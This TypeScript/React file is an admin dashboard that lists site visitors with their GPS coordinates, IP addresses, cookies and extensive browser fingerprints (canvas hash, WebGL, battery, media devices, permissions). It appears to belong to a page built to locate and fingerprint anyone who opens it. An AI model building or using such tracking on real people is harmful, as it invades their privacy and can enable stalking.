"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";

type AnyObj = Record<string, unknown>;

type LocPoint = {
  latitude: number;
  longitude: number;
  accuracy?: number | null;
  altitude?: number | null;
  source?: string;
  city?: string | null;
  region?: string | null;
  country?: string | null;
  mapsUrl?: string | null;
  at?: string;
};

type LocationRow = {
  id: string;
  visitorId: string | null;
  sessionId: string | null;
  stage: string | null;
  latitude: number | null;
  longitude: number | null;
  accuracy: number | null;
  altitude: number | null;
  heading: number | null;
  speed: number | null;
  locationGranted: boolean;
  locationCount?: number;
  locations?: LocPoint[];
  ip: string | null;
  cookies: Record<string, string> | null;
  events: { type?: string; at?: string }[] | null;
  device: AnyObj | null;
  server: AnyObj | null;
  createdAt: string;
  mapsUrl: string | null;
};

function str(v: unknown, fallback = "—") {
  if (v === null || v === undefined || v === "") return fallback;
  if (typeof v === "boolean") return v ? "Yes" : "No";
  if (typeof v === "object") return JSON.stringify(v);
  return String(v);
}

export default function AdminDashboard() {
  const router = useRouter();
  const [rows, setRows] = useState<LocationRow[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [expanded, setExpanded] = useState<string | null>(null);
  const [filter, setFilter] = useState<"all" | "mobile" | "desktop" | "tablet">(
    "all"
  );
  const [q, setQ] = useState("");

  const load = useCallback(async () => {
    setLoading(true);
    setError("");
    try {
      const res = await fetch("/api/admin/locations", { cache: "no-store" });
      if (res.status === 401) {
        router.replace("/admin/login");
        return;
      }
      const data = await res.json();
      if (!res.ok || !data.ok) {
        setError(data.message || "Failed to load");
        return;
      }
      setRows(data.locations || []);
    } catch {
      setError("Network error");
    } finally {
      setLoading(false);
    }
  }, [router]);

  useEffect(() => {
    load();
  }, [load]);

  async function logout() {
    await fetch("/api/admin/logout", { method: "POST" });
    router.replace("/admin/login");
  }

  const stats = useMemo(() => {
    let mobile = 0;
    let desktop = 0;
    let tablet = 0;
    let withLoc = 0;
    for (const r of rows) {
      const t = String(r.device?.deviceType || "").toLowerCase();
      if (t === "mobile") mobile++;
      else if (t === "tablet") tablet++;
      else desktop++;
      if (r.locationGranted && r.latitude != null) withLoc++;
    }
    return { mobile, desktop, tablet, withLoc, total: rows.length };
  }, [rows]);

  const filtered = useMemo(() => {
    return rows.filter((r) => {
      const t = String(r.device?.deviceType || "Desktop").toLowerCase();
      if (filter !== "all" && t !== filter) return false;
      if (!q.trim()) return true;
      const hay = JSON.stringify(r).toLowerCase();
      return hay.includes(q.trim().toLowerCase());
    });
  }, [rows, filter, q]);

  return (
    <div className="min-h-dvh bg-[#0b0b0f] text-white">
      <header className="sticky top-0 z-20 border-b border-white/10 bg-[#0b0b0f]/95 backdrop-blur-xl">
        <div className="mx-auto flex max-w-6xl flex-wrap items-center justify-between gap-3 px-4 py-4">
          <div>
            <h1 className="text-lg font-bold sm:text-xl">Admin Panel</h1>
            <p className="text-xs text-white/40">
              Full device fingerprint + location from every visit
            </p>
          </div>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={load}
              className="rounded-xl border border-white/10 px-3 py-2 text-xs font-medium text-white/80 transition hover:bg-white/5"
            >
              Refresh
            </button>
            <button
              type="button"
              onClick={logout}
              className="rounded-xl bg-white/10 px-3 py-2 text-xs font-medium transition hover:bg-white/15"
            >
              Logout
            </button>
          </div>
        </div>
      </header>

      <main className="mx-auto max-w-6xl px-4 py-6">
        {/* Stats */}
        <div className="mb-5 grid grid-cols-2 gap-3 sm:grid-cols-5">
          <Stat label="Total" value={loading ? "…" : stats.total} />
          <Stat label="Mobile" value={loading ? "…" : stats.mobile} accent="violet" />
          <Stat label="Desktop" value={loading ? "…" : stats.desktop} accent="sky" />
          <Stat label="Tablet" value={loading ? "…" : stats.tablet} accent="amber" />
          <Stat label="With location" value={loading ? "…" : stats.withLoc} accent="emerald" />
        </div>

        {/* Filters */}
        <div className="mb-5 flex flex-col gap-3 sm:flex-row sm:items-center">
          <div className="flex flex-wrap gap-2">
            {(
              [
                ["all", "All"],
                ["mobile", "Mobile"],
                ["desktop", "Desktop"],
                ["tablet", "Tablet"],
              ] as const
            ).map(([key, label]) => (
              <button
                key={key}
                type="button"
                onClick={() => setFilter(key)}
                className={`rounded-full px-3 py-1.5 text-xs font-medium transition ${
                  filter === key
                    ? "bg-white text-black"
                    : "border border-white/15 text-white/70 hover:bg-white/5"
                }`}
              >
                {label}
              </button>
            ))}
          </div>
          <input
            value={q}
            onChange={(e) => setQ(e.target.value)}
            placeholder="Search IP, browser, OS, model…"
            className="w-full flex-1 rounded-xl border border-white/10 bg-white/5 px-3 py-2 text-sm text-white outline-none placeholder:text-white/30 focus:ring-2 focus:ring-violet-500/40 sm:max-w-xs"
          />
        </div>

        {error ? (
          <p className="mb-4 rounded-xl bg-red-500/10 px-4 py-3 text-sm text-red-300">
            {error}
          </p>
        ) : null}

        {loading ? (
          <div className="flex justify-center py-20">
            <div className="h-10 w-10 animate-spin rounded-full border-2 border-white/10 border-t-white" />
          </div>
        ) : filtered.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-white/15 px-6 py-16 text-center">
            <p className="text-white/70">No visits found</p>
            <p className="mt-1 text-sm text-white/35">
              Open the home page from any phone or desktop
            </p>
          </div>
        ) : (
          <ul className="space-y-3">
            {filtered.map((row, index) => {
              const open = expanded === row.id;
              const d = row.device || {};
              const server = row.server || {};
              const deviceType = str(d.deviceType, "Desktop");
              const points = Array.isArray(row.locations) ? row.locations : [];
              const hasLoc =
                (row.latitude != null && row.longitude != null) ||
                points.length > 0;

              return (
                <li
                  key={row.id}
                  className="overflow-hidden rounded-2xl border border-white/10 bg-white/[0.03]"
                >
                  {/* Summary row */}
                  <div className="flex flex-col gap-3 p-4 lg:flex-row lg:items-center lg:justify-between">
                    <div className="min-w-0 flex-1">
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="rounded-lg bg-violet-500/20 px-2 py-0.5 text-xs font-medium text-violet-200">
                          #{filtered.length - index}
                        </span>
                        <TypeBadge type={deviceType} />
                        <span
                          className={`rounded-lg px-2 py-0.5 text-[11px] font-medium ${
                            hasLoc
                              ? "bg-emerald-500/15 text-emerald-300"
                              : "bg-white/10 text-white/45"
                          }`}
                        >
                          {hasLoc
                            ? `${points.length || 1} location${
                                (points.length || 1) > 1 ? "s" : ""
                              }`
                            : "No location"}
                        </span>
                        <span className="text-xs text-white/40">
                          {row.createdAt
                            ? new Date(row.createdAt).toLocaleString()
                            : "—"}
                        </span>
                      </div>

                      <p className="mt-2 text-sm font-semibold text-white">
                        {str(d.os)} {d.osVersion ? str(d.osVersion) : ""} ·{" "}
                        {str(d.browser)}{" "}
                        {d.browserVersion
                          ? String(d.browserVersion).split(".")[0]
                          : ""}
                        {d.deviceModel ? ` · ${str(d.deviceModel)}` : ""}
                      </p>

                      <p className="mt-1 truncate text-xs text-white/40">
                        {hasLoc
                          ? `${Number(row.latitude).toFixed(5)}, ${Number(row.longitude).toFixed(5)}`
                          : "Coords unavailable"}
                        {row.ip ? ` · IP ${row.ip}` : ""}
                        {server.country ? ` · ${str(server.country)}` : ""}
                        {server.city ? `, ${str(server.city)}` : ""}
                      </p>
                      {row.visitorId ? (
                        <p className="mt-1 truncate font-mono text-[10px] text-white/30">
                          vid: {row.visitorId}
                          {row.stage ? ` · stage: ${row.stage}` : ""}
                        </p>
                      ) : null}
                    </div>

                    <div className="flex shrink-0 flex-wrap gap-2">
                      {row.mapsUrl ? (
                        <a
                          href={row.mapsUrl}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="inline-flex items-center justify-center rounded-xl bg-emerald-500 px-4 py-2.5 text-sm font-semibold text-black transition hover:bg-emerald-400 active:scale-[0.98]"
                        >
                          Open in Maps
                        </a>
                      ) : null}
                      <button
                        type="button"
                        onClick={() => setExpanded(open ? null : row.id)}
                        className="rounded-xl border border-white/15 px-4 py-2.5 text-sm font-medium text-white/80 hover:bg-white/5"
                      >
                        {open ? "Hide details" : "Full details"}
                      </button>
                    </div>
                  </div>

                  {open ? (
                    <div className="border-t border-white/10 bg-black/25 px-4 py-4">
                      <div className="grid gap-3 sm:grid-cols-2 xl:grid-cols-3">
                        <InfoCard title="📍 Locations (array)">
                          <Row k="Count" v={String(points.length || (hasLoc ? 1 : 0))} />
                          <Row k="GPS granted" v={row.locationGranted ? "Yes" : "No"} />
                          <Row k="Stage" v={str(row.stage)} />
                          <Row
                            k="Primary lat"
                            v={row.latitude != null ? String(row.latitude) : "—"}
                          />
                          <Row
                            k="Primary lng"
                            v={
                              row.longitude != null
                                ? String(row.longitude)
                                : "—"
                            }
                          />
                          <Row
                            k="Accuracy"
                            v={
                              row.accuracy != null
                                ? `${Math.round(row.accuracy)} m`
                                : "—"
                            }
                          />

                          {points.length > 0 ? (
                            <div className="mt-3 space-y-2 border-t border-white/10 pt-2">
                              {points.map((p, i) => (
                                <div
                                  key={`${p.latitude}-${p.longitude}-${i}`}
                                  className="rounded-lg bg-white/5 p-2"
                                >
                                  <div className="flex items-center justify-between gap-2">
                                    <span className="text-[11px] font-semibold uppercase text-white/50">
                                      #{i + 1} · {p.source || "unknown"}
                                    </span>
                                    {p.mapsUrl ? (
                                      <a
                                        href={p.mapsUrl}
                                        target="_blank"
                                        rel="noopener noreferrer"
                                        className="text-[11px] font-semibold text-emerald-400 hover:underline"
                                      >
                                        Maps →
                                      </a>
                                    ) : null}
                                  </div>
                                  <p className="mt-1 font-mono text-xs text-white/90">
                                    {p.latitude}, {p.longitude}
                                  </p>
                                  <p className="mt-0.5 text-[11px] text-white/40">
                                    {p.accuracy != null
                                      ? `±${Math.round(p.accuracy)}m · `
                                      : ""}
                                    {[p.city, p.region, p.country]
                                      .filter(Boolean)
                                      .join(", ") || "—"}
                                    {p.at
                                      ? ` · ${new Date(p.at).toLocaleString()}`
                                      : ""}
                                  </p>
                                </div>
                              ))}
                            </div>
                          ) : row.mapsUrl ? (
                            <a
                              href={row.mapsUrl}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="mt-2 inline-block text-sm font-medium text-emerald-400 hover:underline"
                            >
                              Google Maps →
                            </a>
                          ) : (
                            <p className="mt-2 text-sm text-white/40">
                              No points in array yet
                            </p>
                          )}
                        </InfoCard>

                        <InfoCard title="🍪 Cookies & tracking">
                          <Row k="Visitor ID" v={str(row.visitorId)} />
                          <Row k="Session ID" v={str(row.sessionId)} />
                          {row.cookies &&
                          Object.keys(row.cookies).length > 0 ? (
                            Object.entries(row.cookies).map(([k, v]) => (
                              <Row key={k} k={k} v={str(v)} />
                            ))
                          ) : (
                            <p className="text-sm text-white/40">No cookies</p>
                          )}
                          {row.events && row.events.length > 0 ? (
                            <div className="mt-2 border-t border-white/10 pt-2">
                              <p className="mb-1 text-[11px] text-white/40">
                                Events
                              </p>
                              {row.events.map((ev, i) => (
                                <p
                                  key={i}
                                  className="text-[11px] text-white/60"
                                >
                                  {ev.type || "event"}
                                  {ev.at
                                    ? ` · ${new Date(ev.at).toLocaleString()}`
                                    : ""}
                                </p>
                              ))}
                            </div>
                          ) : null}
                        </InfoCard>

                        <InfoCard title="🖥 Device">
                          <Row k="Type" v={deviceType} />
                          <Row k="OS" v={str(d.os)} />
                          <Row k="OS version" v={str(d.osVersion)} />
                          <Row k="Browser" v={str(d.browser)} />
                          <Row k="Browser ver." v={str(d.browserVersion)} />
                          <Row k="Model" v={str(d.deviceModel)} />
                          <Row k="Platform" v={str(d.platform)} />
                          <Row k="Vendor" v={str(d.vendor)} />
                          <Row k="Mobile" v={str(d.isMobile)} />
                          <Row k="Tablet" v={str(d.isTablet)} />
                          <Row k="Touch" v={str(d.isTouch)} />
                          <Row k="Max touch points" v={str(d.maxTouchPoints)} />
                        </InfoCard>

                        <InfoCard title="⚙️ Hardware">
                          <Row k="CPU cores" v={str(d.hardwareConcurrency)} />
                          <Row
                            k="Device memory"
                            v={
                              d.deviceMemory != null
                                ? `${d.deviceMemory} GB`
                                : "—"
                            }
                          />
                          <Row k="Canvas hash" v={str(d.canvasHash)} />
                          <Row k="Webdriver" v={str(d.webdriver)} />
                          <Row k="PDF viewer" v={str(d.pdfViewerEnabled)} />
                          <Row k="Cookies" v={str(d.cookieEnabled)} />
                          <Row k="Do Not Track" v={str(d.doNotTrack)} />
                          <Row k="LocalStorage" v={str(d.localStorageEnabled)} />
                          <Row
                            k="SessionStorage"
                            v={str(d.sessionStorageEnabled)}
                          />
                          <Row k="IndexedDB" v={str(d.indexedDBEnabled)} />
                          <Row
                            k="Service Worker"
                            v={str(d.serviceWorkerEnabled)}
                          />
                        </InfoCard>

                        <InfoCard title="📱 Screen & display">
                          <Row
                            k="Screen"
                            v={
                              d.screen && typeof d.screen === "object"
                                ? `${(d.screen as AnyObj).width}×${(d.screen as AnyObj).height}`
                                : "—"
                            }
                          />
                          <Row
                            k="Available"
                            v={
                              d.screen && typeof d.screen === "object"
                                ? `${(d.screen as AnyObj).availWidth}×${(d.screen as AnyObj).availHeight}`
                                : "—"
                            }
                          />
                          <Row
                            k="Color depth"
                            v={
                              d.screen && typeof d.screen === "object"
                                ? str((d.screen as AnyObj).colorDepth)
                                : "—"
                            }
                          />
                          <Row
                            k="Orientation"
                            v={
                              d.screen && typeof d.screen === "object"
                                ? str((d.screen as AnyObj).orientation)
                                : "—"
                            }
                          />
                          <Row
                            k="Viewport"
                            v={
                              d.viewport && typeof d.viewport === "object"
                                ? `${(d.viewport as AnyObj).width}×${(d.viewport as AnyObj).height}`
                                : "—"
                            }
                          />
                          <Row
                            k="Outer window"
                            v={
                              d.viewport && typeof d.viewport === "object"
                                ? `${(d.viewport as AnyObj).outerWidth}×${(d.viewport as AnyObj).outerHeight}`
                                : "—"
                            }
                          />
                          <Row
                            k="Pixel ratio"
                            v={
                              d.viewport && typeof d.viewport === "object"
                                ? str((d.viewport as AnyObj).devicePixelRatio)
                                : "—"
                            }
                          />
                          <Row k="Color scheme" v={str(d.prefersColorScheme)} />
                          <Row k="Color gamut" v={str(d.colorGamut)} />
                          <Row k="HDR" v={str(d.hdr)} />
                          <Row k="Hover" v={str(d.hover)} />
                          <Row k="Pointer fine" v={str(d.pointerFine)} />
                          <Row k="Pointer coarse" v={str(d.pointerCoarse)} />
                        </InfoCard>

                        <InfoCard title="🌐 Network & power">
                          <Row k="IP" v={row.ip || "—"} />
                          <Row k="Online" v={str(d.online)} />
                          <Row
                            k="Connection"
                            v={
                              d.connection && typeof d.connection === "object"
                                ? str((d.connection as AnyObj).effectiveType)
                                : "—"
                            }
                          />
                          <Row
                            k="Downlink"
                            v={
                              d.connection && typeof d.connection === "object"
                                ? (d.connection as AnyObj).downlink != null
                                  ? `${(d.connection as AnyObj).downlink} Mbps`
                                  : "—"
                                : "—"
                            }
                          />
                          <Row
                            k="RTT"
                            v={
                              d.connection && typeof d.connection === "object"
                                ? (d.connection as AnyObj).rtt != null
                                  ? `${(d.connection as AnyObj).rtt} ms`
                                  : "—"
                                : "—"
                            }
                          />
                          <Row
                            k="Save data"
                            v={
                              d.connection && typeof d.connection === "object"
                                ? str((d.connection as AnyObj).saveData)
                                : "—"
                            }
                          />
                          <Row
                            k="Battery"
                            v={
                              d.battery && typeof d.battery === "object"
                                ? `${(d.battery as AnyObj).level}%${
                                    (d.battery as AnyObj).charging
                                      ? " (charging)"
                                      : ""
                                  }`
                                : "—"
                            }
                          />
                          <Row
                            k="Storage quota"
                            v={
                              d.storage && typeof d.storage === "object"
                                ? (d.storage as AnyObj).quotaGB != null
                                  ? `${(d.storage as AnyObj).quotaGB} GB`
                                  : "—"
                                : "—"
                            }
                          />
                        </InfoCard>

                        <InfoCard title="🗺 Locale & page">
                          <Row k="Language" v={str(d.language)} />
                          <Row
                            k="Languages"
                            v={
                              Array.isArray(d.languages)
                                ? d.languages.join(", ")
                                : "—"
                            }
                          />
                          <Row k="Timezone" v={str(d.timezone)} />
                          <Row
                            k="TZ offset (min)"
                            v={str(d.timezoneOffset)}
                          />
                          <Row k="Locale" v={str(d.locale)} />
                          <Row k="Page URL" v={str(d.pageUrl)} />
                          <Row k="Referrer" v={str(d.referrer)} />
                          <Row k="History length" v={str(d.historyLength)} />
                          <Row
                            k="Notifications"
                            v={str(d.notificationPermission)}
                          />
                          <Row k="Collected at" v={str(d.collectedAt)} />
                        </InfoCard>

                        <InfoCard title="🎮 GPU / WebGL">
                          {d.webgl && typeof d.webgl === "object" ? (
                            <>
                              <Row
                                k="Vendor"
                                v={str((d.webgl as AnyObj).unmaskedVendor || (d.webgl as AnyObj).vendor)}
                              />
                              <Row
                                k="Renderer"
                                v={str(
                                  (d.webgl as AnyObj).unmaskedRenderer ||
                                    (d.webgl as AnyObj).renderer
                                )}
                              />
                              <Row
                                k="Version"
                                v={str((d.webgl as AnyObj).version)}
                              />
                              <Row
                                k="GLSL"
                                v={str(
                                  (d.webgl as AnyObj).shadingLanguageVersion
                                )}
                              />
                            </>
                          ) : (
                            <p className="text-sm text-white/40">Not available</p>
                          )}
                        </InfoCard>

                        <InfoCard title="🎤 Media & audio">
                          {d.mediaDevices && typeof d.mediaDevices === "object" ? (
                            <>
                              <Row
                                k="Mics"
                                v={str((d.mediaDevices as AnyObj).audioinput)}
                              />
                              <Row
                                k="Speakers"
                                v={str((d.mediaDevices as AnyObj).audiooutput)}
                              />
                              <Row
                                k="Cameras"
                                v={str((d.mediaDevices as AnyObj).videoinput)}
                              />
                            </>
                          ) : (
                            <Row k="Media devices" v="—" />
                          )}
                          {d.audio && typeof d.audio === "object" ? (
                            <>
                              <Row
                                k="Sample rate"
                                v={str((d.audio as AnyObj).sampleRate)}
                              />
                              <Row
                                k="Audio state"
                                v={str((d.audio as AnyObj).state)}
                              />
                              <Row
                                k="Max channels"
                                v={str((d.audio as AnyObj).maxChannelCount)}
                              />
                            </>
                          ) : null}
                        </InfoCard>

                        <InfoCard title="🔐 Permissions">
                          {d.permissions &&
                          typeof d.permissions === "object" &&
                          Object.keys(d.permissions as AnyObj).length > 0 ? (
                            Object.entries(d.permissions as AnyObj).map(
                              ([k, v]) => <Row key={k} k={k} v={str(v)} />
                            )
                          ) : (
                            <p className="text-sm text-white/40">Not available</p>
                          )}
                        </InfoCard>

                        <InfoCard title="🛰 Server / edge">
                          <Row k="IP" v={str(server.ip || row.ip)} />
                          <Row k="Country" v={str(server.country)} />
                          <Row k="Region" v={str(server.region)} />
                          <Row k="City" v={str(server.city)} />
                          <Row k="Server TZ" v={str(server.timezone)} />
                          <Row k="Received" v={str(server.receivedAt)} />
                          {server.headers &&
                          typeof server.headers === "object" ? (
                            <>
                              <Row
                                k="sec-ch-ua-platform"
                                v={str(
                                  (server.headers as AnyObj)[
                                    "sec-ch-ua-platform"
                                  ]
                                )}
                              />
                              <Row
                                k="sec-ch-ua-mobile"
                                v={str(
                                  (server.headers as AnyObj)["sec-ch-ua-mobile"]
                                )}
                              />
                              <Row
                                k="Accept-Language"
                                v={str(
                                  (server.headers as AnyObj)["accept-language"]
                                )}
                              />
                            </>
                          ) : null}
                        </InfoCard>

                        {d.uaData && typeof d.uaData === "object" ? (
                          <InfoCard title="✨ Client Hints (UA-CH)">
                            <Row
                              k="Platform"
                              v={str((d.uaData as AnyObj).platform)}
                            />
                            <Row
                              k="Platform ver."
                              v={str((d.uaData as AnyObj).platformVersion)}
                            />
                            <Row
                              k="Architecture"
                              v={str((d.uaData as AnyObj).architecture)}
                            />
                            <Row
                              k="Bitness"
                              v={str((d.uaData as AnyObj).bitness)}
                            />
                            <Row k="Model" v={str((d.uaData as AnyObj).model)} />
                            <Row
                              k="Mobile"
                              v={str((d.uaData as AnyObj).mobile)}
                            />
                            <Row
                              k="Full version"
                              v={str((d.uaData as AnyObj).uaFullVersion)}
                            />
                            <Row
                              k="Brands"
                              v={
                                Array.isArray((d.uaData as AnyObj).brands)
                                  ? ((d.uaData as AnyObj).brands as string[]).join(
                                      ", "
                                    )
                                  : "—"
                              }
                            />
                          </InfoCard>
                        ) : null}
                      </div>

                      {/* User agent raw */}
                      {d.userAgent ? (
                        <div className="mt-4">
                          <p className="mb-1 text-[11px] font-semibold uppercase tracking-wide text-white/35">
                            User-Agent
                          </p>
                          <p className="break-all rounded-xl bg-white/5 p-3 font-mono text-[11px] leading-relaxed text-white/50">
                            {String(d.userAgent)}
                          </p>
                        </div>
                      ) : null}

                      {/* Full JSON dump */}
                      <details className="mt-4">
                        <summary className="cursor-pointer text-xs font-medium text-white/50 hover:text-white/80">
                          Raw JSON (all fields)
                        </summary>
                        <pre className="mt-2 max-h-80 overflow-auto rounded-xl bg-black/50 p-3 font-mono text-[10px] leading-relaxed text-white/55">
                          {JSON.stringify(
                            {
                              location: {
                                latitude: row.latitude,
                                longitude: row.longitude,
                                accuracy: row.accuracy,
                                altitude: row.altitude,
                                heading: row.heading,
                                speed: row.speed,
                                locationGranted: row.locationGranted,
                              },
                              ip: row.ip,
                              server: row.server,
                              device: row.device,
                              createdAt: row.createdAt,
                            },
                            null,
                            2
                          )}
                        </pre>
                      </details>
                    </div>
                  ) : null}
                </li>
              );
            })}
          </ul>
        )}
      </main>
    </div>
  );
}

function Stat({
  label,
  value,
  accent,
}: {
  label: string;
  value: string | number;
  accent?: "violet" | "sky" | "amber" | "emerald";
}) {
  const colors: Record<string, string> = {
    violet: "text-violet-300",
    sky: "text-sky-300",
    amber: "text-amber-300",
    emerald: "text-emerald-300",
  };
  return (
    <div className="rounded-2xl border border-white/10 bg-white/[0.03] px-4 py-3">
      <p className="text-[11px] uppercase tracking-wide text-white/40">{label}</p>
      <p className={`text-2xl font-bold ${accent ? colors[accent] : ""}`}>
        {value}
      </p>
    </div>
  );
}

function TypeBadge({ type }: { type: string }) {
  const t = type.toLowerCase();
  const cls =
    t === "mobile"
      ? "bg-violet-500/20 text-violet-200"
      : t === "tablet"
        ? "bg-amber-500/20 text-amber-200"
        : "bg-sky-500/20 text-sky-200";
  return (
    <span className={`rounded-lg px-2 py-0.5 text-xs font-medium ${cls}`}>
      {type}
    </span>
  );
}

function InfoCard({
  title,
  children,
}: {
  title: string;
  children: React.ReactNode;
}) {
  return (
    <div className="rounded-xl border border-white/8 bg-white/[0.02] p-3">
      <p className="mb-2 text-xs font-semibold tracking-wide text-white/50">
        {title}
      </p>
      <div className="space-y-1.5">{children}</div>
    </div>
  );
}

function Row({ k, v }: { k: string; v: string }) {
  return (
    <div className="flex items-start justify-between gap-3 text-sm">
      <span className="shrink-0 text-white/40">{k}</span>
      <span className="break-all text-right font-medium text-white/90">{v}</span>
    </div>
  );
}
